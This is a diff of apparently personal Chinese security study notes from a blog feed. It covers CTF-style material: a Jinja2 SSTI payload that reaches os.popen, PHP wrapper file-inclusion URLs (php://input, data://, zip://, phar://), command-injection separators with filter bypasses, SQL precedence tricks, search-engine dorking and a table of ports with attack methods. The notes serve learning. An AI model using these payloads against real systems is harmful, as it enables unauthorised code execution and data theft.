+<h2 id="ssit官方漏洞利用"><a href="#ssit官方漏洞利用" class="headerlink" title="ssit官方漏洞利用"></a>ssit官方漏洞利用</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].<span class="keyword">__class__</span>.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.<span class="keyword">__class__</span> == &#123;&#125;.<span class="keyword">__class__</span> %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;         <span class="comment">//poppen的参数就是要执行的命令</span></span><br><span class="line">    &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">endfor</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>
 
-<p>2.php://input + [POST DATA]执行php代码</p>
-<p><code>enctype=&quot;multipart/form-data&quot;</code> 的时候 php://input 是无效的。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span></span><br><span class="line">[POST DATA部分]</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Linux能打开文件的命令"><a href="#Linux能打开文件的命令" class="headerlink" title="Linux能打开文件的命令"></a>Linux能打开文件的命令</h2><ul>
+<li><p><code>cat</code> 由第一行开始显示内容，并将所有内容输出</p>
+</li>
+<li><p><code>tac</code> 从最后一行倒序显示内容，并将所有内容输出</p>
+</li>
+<li><p><code>more</code> 根据窗口大小，一页一页的显示文件内容</p>
+</li>
+<li><p><code>less</code> 和<code>more</code>相似，但其优点可以往前翻页，并且进行可以搜索字符(使用<code>q</code>或者<code>ctrl</code>+<code>z</code>退出，<code>j</code>下一行,<code>k</code>上一行)</p>
+</li>
+<li><p><code>head</code> 只显示头几行</p>
+</li>
+<li><p><code>tail</code> 只显示最后几行</p>
+</li>
+<li><p><code>nl</code> 类似于cat -n，显示时输出行号</p>
+</li>
+<li><p><code>tailf</code> 类似于<code>tail -f</code></p>
+</li>
+<li><p><code>sed</code> 使用<code>sed -n &#39;p&#39; 1.txt</code>来打开文件，如果使用<code>sed &#39;p&#39; 1.txt</code>每一行会输出两次</p>
+</li>
+<li><p><code>sort</code> 将文件进行排序，并将排序结果标准输出</p>
+</li>
+<li><p><code>uniq</code> 用于报告会忽略文件中的重复行</p>
+</li>
+<li><p><code>rev</code> 将文件中的每行内容以字符为单位<strong>反序</strong>输出</p>
+</li>
+<li><p><code>cut</code> 使用<code>cut -c 1- 1.txt</code> 打卡文件 <code>1-</code>是用于指定起始位置和结束位置的，单写一个表示切割那个位置上的数并输出(从1开始)，这里的<code>1-</code>表示，从1开始到末尾</p>
+</li>
+<li><p><code>awk</code> 文本和数据进行处理的编程语言，使用<code>awk &#39;&#123;print&#125;&#39; 1.txt</code>打卡文件</p>
+</li>
+<li><p><code>stings</code> 在对象文件或二进制文件中查找可打印的字符串(可用于打卡<code>.c</code>后缀的文件)</p>
+</li>
+<li><p><code>od</code> 输出文件的八进制，十六进制等格式编码的字节，使用<code>od -c 1.txt</code>打开文件</p>
+</li>
+<li><p><code>paste</code> 用于将多个文件按照队列进行合并。可用于读取文件</p>
+</li>
+<li><p><code>diff</code> 比较给定两个文件的不同，可用于读取数据<code>diff 1.txt 2.txt</code></p>
+</li>
+<li><p><code>curl</code> 使用<code>file:///xxx/xxx.txt</code>可读取文件</p>
+</li>
+<li><p><code>bzmore</code> 查看<code>bzip2</code>压缩过的文本文件的内容</p>
+</li>
+<li><p><code>bzless</code> 是增强<code>.bz2</code>压缩包查看器，<code>bzless</code>比<code>bzmore</code>命令功能更强大</p>
+</li>
+</ul>
+<h2 id="两个-和三个-的区别"><a href="#两个-和三个-的区别" class="headerlink" title="两个==和三个===的区别"></a>两个==和三个===的区别</h2><ul>
+<li><p><code>==</code> 两边值类型不同的时候，要先进行类型转换，再比较。</p>
+<p>所以在<code>==</code>双等号的比较中以<code>0e</code>开头的都会转化成科学计数法。而科学计数法中<code>0</code>乘任何数都是0。</p>
+</li>
+<li><p><code>===</code> 不做类型转换，类型不同的一定不等。</p>
+</li>
+</ul>
+<h2 id="0day"><a href="#0day" class="headerlink" title="0day"></a>0day</h2><p><strong>网络安全</strong>意思上的<code>0day</code>就是指一些没有公布补丁的漏洞，或者是还没有被漏洞发现者公布出来的漏洞利用工具，由于这种漏洞的利用程序对网络安全都具有巨大威胁，因此<code>0day</code>也成为黑客的最爱。</p>
+<h2 id="sql语句中and和or的优先级"><a href="#sql语句中and和or的优先级" class="headerlink" title="sql语句中and和or的优先级"></a>sql语句中and和or的优先级</h2><p>例如:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-<img src="PHP伪协议/image-20211010142310571.png" alt="image-20211010142310571" style="zoom: 80%;" />
-
-<p>(我用的是CFT中的一道题，本地好像有点问题)得到</p>
-<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20211010142416110.png" class="" title="image-20211010142416110">
-
-<h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><h3 id="条件-2"><a href="#条件-2" class="headerlink" title="条件:"></a>条件:</h3><ol>
-<li>allow_url_fopen:on</li>
-<li>allow_url_fopen:on</li>
+<p>这里<code>and</code>的优先级高于<code>or</code>，所以是先判断<code>&#39;1&#39;=&#39;1&#39;</code>和<code>password=&#39;1&#39;</code>为假，但<code>admin</code>为真，所以整体为真。</p>
+<h2 id="什么是分布式"><a href="#什么是分布式" class="headerlink" title="什么是分布式"></a>什么是分布式</h2><p>分布式是指通过网络连接的多个组件，通过交换信息协作而形成的系统。分布式不一定就是不同的组件，同一个组件也可以，关键在于是否通过交换信息的方式进行协作。</p>
+<p>集群，是指同一种组件的多个实例，形成的逻辑上的整体。分布式系统也可以是一个集群。</p>
+<h2 id="什么是IIS"><a href="#什么是IIS" class="headerlink" title="什么是IIS"></a>什么是IIS</h2><p><code>IIS</code>全称是互联网信息服务，是一种<code>Web</code>（网页）服务组件，其中包括<code>Web</code>服务器、<code>FTP</code>服务器、<code>NNTP</code>服务器和<code>SMTP</code>服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p>
+<h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><p>系统支持的管道符如下(<code>Linux</code>和<code>windows</code>一样)：</p>
+<ol>
+<li><code>;</code>：执行完前面的语句再执行后面的语句。</li>
+<li><code>|</code>：显示后面语句的执行结果。</li>
+<li><code>||</code>：当前面的语句执行出错时，执行后面的语句。</li>
+<li><code>&amp;</code>：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</li>
+<li><code>&amp;&amp;</code>：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li>
 </ol>
-<h3 id="作用-3"><a href="#作用-3" class="headerlink" title="作用:"></a>作用:</h3><p>自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码</p>
-<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例:"></a>示例:</h3><p>1.data://text/plain</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20211010141723077.png" class="" title="image-20211010141723077">
-
-<p>(我用的是CFT中的一道题，本地好像有点问题)得到</p>
-<p>2.data://text//plain;base64,代码的base64编码</p>
-<img src="PHP伪协议/image-20211010143003591.png" alt="image-20211010143003591" style="zoom: 50%;" />
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>
-
-<p>执行得到结果</p>
-<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20211010142809558.png" class="" title="image-20211010142809558">
-
-<h2 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp;https://协议"></a>http:// &amp;https://协议</h2><h3 id="条件-3"><a href="#条件-3" class="headerlink" title="条件:"></a>条件:</h3><ol>
-<li>allow_url_fopen:on</li>
-<li>allow_url_include:on</li>
-</ol>
-<h3 id="作用-4"><a href="#作用-4" class="headerlink" title="作用:"></a>作用:</h3><p>常规URL形式，允许通过HTTP 1.0的GET方法，以只读访问文件或者资源。CTF中通常用于远程包含</p>
-<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例:"></a>示例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://segmentfault.com/img/bVbrQBP/view" alt="preview"></p>
-<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/123.jpg" class="" title="img">
-
-<p>(不是我的电脑跑出来的)</p>
-<h2 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib://协议"></a>zip:// &amp; bzip2:// &amp; zlib://协议</h2><h3 id="条件-4"><a href="#条件-4" class="headerlink" title="条件:"></a>条件:</h3><ol>
-<li>allow_url_fopen:off/on</li>
-<li>allow_url_fopen:off/on</li>
-</ol>
-<h3 id="作用-5"><a href="#作用-5" class="headerlink" title="作用:"></a>作用:</h3><p>zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀:jpg png gif xxx等等。</p>
-<h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例:"></a>示例:</h3><p>1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</p>
-<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/2601089036-5cc1c48368e3c.jpg" class="" title="preview">
-
-<p>(不是我的电脑跑出来的)</p>
-<p>2.compress.bzip2://file.bz2</p>
-<p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure>
-
-<p>3.compress.zlib://file.gz</p>
-<p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/1671706583-5cc1c49669d55.jpg" class="" title="preview">
-
-<p>(不是我的电脑跑出来的)</p>
-<h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h3><p>phar://协议与zip://类似，同样可以访问zip格式压缩包内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/1498791729-5cc1c53485c22_fix732.jpg" class="" title="图片描述">
-
-<p>(不是我的电脑跑出来的)</p>
-<p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：phar://协议对象注入技术。</p>
-<p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p>
-<p>参考文章：<a href="https://link.segmentfault.com/?enc=uu8GYhazLhEL7GrQ1gKSwQ==.D/ShJaCqBcXzzderXpLTs/CSwUddfeYJPT1whQOEjyg=">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p>
-<p>本文大多数是参考这篇文章得来的，部分图解也来自上面:<a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>
+<ul>
+<li><p>禁用了<code>;</code>，<code>|</code>，<code>&amp;</code>可以使用换行符的<code>url</code>编码(<code>%0a</code>)来绕过(相当于直接执行下一题命令)。</p>
+</li>
+<li><p>禁用空格(<code>%20</code>)可以使用制表符(<code>tab</code>)的<code>url</code>编码<code>%09</code>来绕过。</p>
+</li>
+<li><p>禁用了<code>/</code>可以先用<code>cd</code>进入文件。</p>
+</li>
+</ul>
+<h2 id="Exp、PoC、Webshell和payload的区分"><a href="#Exp、PoC、Webshell和payload的区分" class="headerlink" title="Exp、PoC、Webshell和payload的区分"></a>Exp、PoC、Webshell和payload的区分</h2><p>PoC(全称: Proof of Concept): 一般是我们对于漏洞的判断，即<strong>目标系统是否存在漏洞</strong>。</p>
+<p>Exp(全称: Exploit，漏洞利用程序）: 对已知或已发现的漏洞<strong>进行利用</strong>。</p>
+<p>payload(意为“攻击载荷”): 攻击载荷是我们期望目标系统在<strong>被渗透攻击之后去执行的代码</strong>。</p>
+<p>Webshell就是一个脚本，是以asp、php、jsp或者cgi等网页文件形式存在的，可以对web服务器进行操作的权限。</p>
 ]]></content>
   </entry>
   <entry>
-    <title>HTTP相关知识</title>
-    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/HTTP/</url>
-    <content><![CDATA[<p>根据HTTP标准，HTTP请求可以使用多种请求方法。<br>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。<br>HTTP1.1新增了六种请求方法：OPTIONS, PUT, PATCH, DELETE, TRACE 和 CONNECT 方法。</p>
-<span id="more"></span>
+    <title>Google常见语法</title>
+    <url>/2022/03/12/%E6%9D%82%E9%A1%B9/0ne/Google%E8%AF%AD%E6%B3%95/Google%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="AND-逻辑与"><a href="#AND-逻辑与" class="headerlink" title="AND(逻辑与)"></a>AND(逻辑与)</h3><p>谷歌的默认搜索逻辑是and逻辑，搜索内容同时包含你输入的所有关键词。eg:在输入’google program’之后会搜索出同时包含google和program的网页。</p>
+<h3 id="OR-逻辑或"><a href="#OR-逻辑或" class="headerlink" title="OR(逻辑或)"></a>OR(逻辑或)</h3><p>搜索内容至少包含你输入的关键词中的一种，OR必须是大写(可用’ | ‘代替)，每一个关键词与OR之间有一个空格。eg:在输入’google OR firefox’之后会搜索出包含google或firefox或同时包含google和firefox的内容。</p>
+<h3 id="“-“-不可分割"><a href="#“-“-不可分割" class="headerlink" title="“ “(不可分割)"></a>“ “(不可分割)</h3><p>将搜索内容绑定为一个整体进行搜索。eg:”googleprogram”，结果中的programgoogle都是在一起的，没有分割。</p>
+<h3 id="减去"><a href="#减去" class="headerlink" title="-(减去)"></a>-(减去)</h3><p>搜索的内容中去掉-号后面的内容(中间有个空格)。eg:google -program，结果中都包含google但是不包含program。</p>
+<h3 id="重点"><a href="#重点" class="headerlink" title="+(重点)"></a>+(重点)</h3><p>搜索内容中会将+号后面的内容提前不被忽略。eg:google +program，结果中包含google，其中带有program的内容会被提前。</p>
+<h3 id="和-通配符"><a href="#和-通配符" class="headerlink" title="?和*(通配符)"></a>?和*(通配符)</h3><p>通配符代表占位，可以匹配其他任意字母和单词，而其他的字或词组与用户输入的相同。eg:假设我们要查询Lionel Messi，但是完了单词完整的拼写，可以输入”l*Messi”(必须加上英文的双引号)可以匹配出Lionel Messi。</p>
+<h3 id=""><a href="#" class="headerlink" title=".."></a>..</h3><p>表示数值访问，eg: 身高1.7..1.8 米(100和米之间有个空格，三个点也可)，可以查询到身高1.7到1.8之间的身高。</p>
+<h2 id="高级语法"><a href="#高级语法" class="headerlink" title="高级语法"></a>高级语法</h2><p>intitle: 搜索网页标题中包含有特定字符的网页(可用于社工人的密码)；</p>
+<p>inurl: 搜索包含有特定字符的URL；</p>
+<p>intext: 搜索网页正文内容中的指定字符；</p>
+<p>inanchor: 搜索页面的链接锚点；</p>
+<p>Filetype: 搜索文件的后缀或者扩展名；</p>
+<p>Site: 可以限制你搜索范围的域名；</p>
+<p>link: 查询所有链接到某个特定URL上的列表(eg: link:<a href="http://www.baidu.com,就可以查到所有链接到百度主页的网页);/">www.baidu.com，就可以查到所有链接到百度主页的网页)；</a></p>
+<p>Cache: 可以帮助我们查找到google索引过的页面副本(它最大的好处就是及时源文件界面不存在了，或者变成了其它的内容，我们依然可以搜索的到一些信息，类似于一种缓存(eg:百度快照))；</p>
+<p>related: 用于搜索与某些页面相关的网站(eg: related:<a href="http://www.google.com,会出现一些其他的搜索引擎);/">www.google.com，会出现一些其他的搜索引擎)；</a></p>
+<p>info: 可以搜索到关于这个URL的更多信息的页面列表，这里的信息包括这个网页的cache，还有与这个网页相似的网页等等；</p>
+<p>define: 查询关键词的词义(类似字典)；</p>
+<p>![img](Google语法/google program.png)</p>
+<h2 id="其他相关搜索引擎"><a href="#其他相关搜索引擎" class="headerlink" title="其他相关搜索引擎"></a>其他相关搜索引擎</h2><h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><p>常用语法：</p>
+<ul>
+<li><p>domain= “baidu.com” ，搜索baidu.com所有的子域名。</p>
+</li>
+<li><p>ip= “1.1.1.1” ，搜索ip。</p>
+</li>
+<li><p>host=“edu.cn” ，搜索含有edu.cn的URL。</p>
+</li>
+<li><p>server=“apache” ，搜索服务是apache的网站。</p>
+</li>
+<li><p>os=“windows” ，搜索操作系统是windows的网站。</p>
+</li>
+<li><p>port=3306 或者 protocol==“mysql” ，搜索mysql数据库的网站(mysql对应的端口号为3306)。</p>
+</li>
+<li><p>app=“致远” ，搜索致远oa办公系统搭建的网站(还可以搜设备，比如监控的)。</p>
+</li>
+<li><p>title=“密码” ，从标题中搜索关键字 密码。</p>
+</li>
+<li><p>header=“thinkphp” ，从http的头里面搜thinkphp。</p>
+</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>常见端口及攻击方向</title>
+    <url>/2022/02/26/%E6%9D%82%E9%A1%B9/tw0/%E9%80%9A%E7%94%A8%E6%80%A7%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E5%90%91/</url>
+    <content><![CDATA[<h3 id="常见端口及攻击方向"><a href="#常见端口及攻击方向" class="headerlink" title="常见端口及攻击方向"></a>常见端口及攻击方向</h3><table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th align="left">攻击方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>20(数据端口) 21(控制端口) 69(tftp小型文件传输协议)</td>
+<td>ftp/tftp(69)： 文件传输协议，两台计算机之间的文件传输</td>
+<td align="left">爆破 嗅探 溢出 允许匿名文件上传，下载</td>
+</tr>
+<tr>
+<td>22</td>
+<td>SSH：远程连接</td>
+<td align="left">爆破 SSH隧道及内网代理转发 文件传输</td>
+</tr>
+<tr>
+<td>23</td>
+<td>Telnet：远程连接(常用的远程控制Web服务器的方法)</td>
+<td align="left">爆破 嗅探 弱口令</td>
+</tr>
+<tr>
+<td>25</td>
+<td>SMTP：邮件服务(建立在FTP上)</td>
+<td align="left">邮件伪造</td>
+</tr>
+<tr>
+<td>53</td>
+<td>DNS：域名系统</td>
+<td align="left">DNS区域传输 DNS劫持 DNS缓存投毒 DNS欺骗 深度利用 利用DNS隧道技术刺透防火墙</td>
+</tr>
+<tr>
+<td>67/68</td>
+<td>DHCP：动态主机设置协议</td>
+<td align="left">劫持 欺骗</td>
+</tr>
+<tr>
+<td>110</td>
+<td>pop3：邮局协议版本3</td>
+<td align="left">爆破 嗅探</td>
+</tr>
+<tr>
+<td>139</td>
+<td>Samba：对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是PC机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。</td>
+<td align="left">爆破 未授权访问 远程代码执行</td>
+</tr>
+<tr>
+<td>143</td>
+<td>IMAP：交互邮件访问协议</td>
+<td align="left">爆破</td>
+</tr>
+<tr>
+<td>161</td>
+<td>SNMP：简单网络管理协议，专门设计用于在IP网络管理网络节点（服务器、工作站、路由器、交换机及HUBS等）的一种标准协议，是一种应用层协议。</td>
+<td align="left">爆破</td>
+</tr>
+<tr>
+<td>389</td>
+<td>ldap：轻量级目录访问协议</td>
+<td align="left">注入攻击 未授权访问</td>
+</tr>
+<tr>
+<td>1080</td>
+<td>socket代理：socket代理没什么漏洞，一般在渗透过程中做为我们的代理，在进入内网或渗透域和林的时候有帮助</td>
+<td align="left">爆破 进行内网渗透</td>
+</tr>
+<tr>
+<td>1352</td>
+<td>lotus:一般影响的是大型企业，弱口令偏多，很多管理员不知道如何修改</td>
+<td align="left">爆破 弱口令 信息泄露 跨站脚本攻击</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>mssql：SqlServer的默认端口</td>
+<td align="left">爆破 注入攻击 使用系统用户登录</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>oracle：oracle默认端口</td>
+<td align="left">爆破 TNS 注入攻击</td>
+</tr>
+<tr>
+<td>2049</td>
+<td>nfs：网络文件系统</td>
+<td align="left">配置不当</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>mysql：mysql默认端口</td>
+<td align="left">爆破 拒绝服务 注入 提权</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>rdp：远程显示协议(远程桌面)</td>
+<td align="left">爆破 shift后门</td>
+</tr>
+<tr>
+<td>5000</td>
+<td>sybase/DB2</td>
+<td align="left">爆破 注入</td>
+</tr>
+<tr>
+<td>6379</td>
+<td>redis</td>
+<td align="left">未授权访问 爆破：弱口令</td>
+</tr>
+<tr>
+<td>7001</td>
+<td>weblogic</td>
+<td align="left">java反序列化 控制台弱口令 控制台部署webshell</td>
+</tr>
+<tr>
+<td>80 443 8080</td>
+<td>web</td>
+<td align="left">常见web攻击 控制台爆破 对应服务器版本漏洞</td>
+</tr>
+<tr>
+<td>9090</td>
+<td>websphere控制台</td>
+<td align="left">爆破：控制台弱口令 java 反序列化</td>
+</tr>
+<tr>
+<td>11211</td>
+<td>memcacache</td>
+<td align="left">未授权访问</td>
+</tr>
+<tr>
+<td>27017</td>
+<td>mongodb</td>
+<td align="left">未授权访问</td>
+</tr>
+</tbody></table>
+<p>文章参考:<a href="https://blog.csdn.net/qq_36594628/article/details/119031972">https://blog.csdn.net/qq_36594628/article/details/119031972</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>信息泄露</title>
+    <url>/2022/03/12/%E6%9D%82%E9%A1%B9/tw0/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
+    <content><![CDATA[<h2 id="Web源码泄露"><a href="#Web源码泄露" class="headerlink" title="Web源码泄露"></a>Web源码泄露</h2><h4 id="hg源码泄露"><a href="#hg源码泄露" class="headerlink" title=".hg源码泄露"></a>.hg源码泄露</h4><p>漏洞原因: hg init 的时候会生成.hg文件</p>
+<h4 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title=".git源码泄露"></a>.git源码泄露</h4><p>漏洞成因: 在运行 git init 初始化代码库的时候，会在当前目录下产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发不了。使用这个文件，可以用来恢复源代码。</p>
+<h4 id="DS-Store源码泄露"><a href="#DS-Store源码泄露" class="headerlink" title=".DS_Store源码泄露"></a>.DS_Store源码泄露</h4><p>漏洞成因: 在发布代码时未删除文件夹中隐藏的.DS_Store，被发现后，获取了敏感的文件名等信息。</p>
+<h4 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h4><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
+<p>漏洞成因: </p>
+<ul>
+<li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li>
+<li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li>
+</ul>
+<p>常见备份后缀: .rar、.zip、.7z、.tar.gz、.bak、.txt、.old、.temp、.html、.swp</p>
+<p>.swp文件:</p>
+<ul>
+<li>当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。</li>
+<li>需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生.swp文件的。</li>
+<li>意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。</li>
+</ul>
+<p>例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。</p>
+<p>服务器无法解析.swp文件所以需要通过浏览器下载到linux中的vim中去查看。</p>
+<h4 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h4><ul>
+<li>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</li>
+<li>Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</li>
+</ul>
+<h2 id="应用服务、软件方面的信息泄露"><a href="#应用服务、软件方面的信息泄露" class="headerlink" title="应用服务、软件方面的信息泄露"></a>应用服务、软件方面的信息泄露</h2><h3 id="DNS域传送问题"><a href="#DNS域传送问题" class="headerlink" title="DNS域传送问题"></a>DNS域传送问题</h3><p>DNS服务器的主备数据同步，使用的是域传送功能。域传送关键配置项为：</p>
+<ul>
+<li>allow-transfer{ipaddress;}；通过ip限制可进行域传送的服务器。</li>
+<li>allow-stransfer{ key transfer;}；通过key限制可进行域传送的服务器。</li>
+</ul>
+<p>设置方式为两种: 一种设置在options配置域；一种设置在zone配置域。优先级为zone&gt;soptions。</p>
+<p>如果自己使用默认配置文件进行配置的话(不手动添加allow-transfer项)，就会存在DNS域传送漏洞。会造成子域名泄露。</p>
+<h3 id="堆栈溢出漏洞"><a href="#堆栈溢出漏洞" class="headerlink" title="堆栈溢出漏洞"></a>堆栈溢出漏洞</h3><p>使用了try{…}catche(e){e.printstack;}</p>
+<p>故意修改请求路径或者http请求方法使页面报错，由于使用了printstack可以得到堆栈的一些信息报错。如通过报错得到了网站存在某个组件，通过组件可以进行相应攻击。</p>
+<h3 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h3><p>未授权访问漏洞:</p>
+<p>服务启动未配置任何认证口令。</p>
+<p>弱口令漏洞:</p>
+<p>简单的口令，如admin123。</p>
+<p>空口令漏洞:</p>
+<p>可以配置口令，也可以配置空口令。</p>
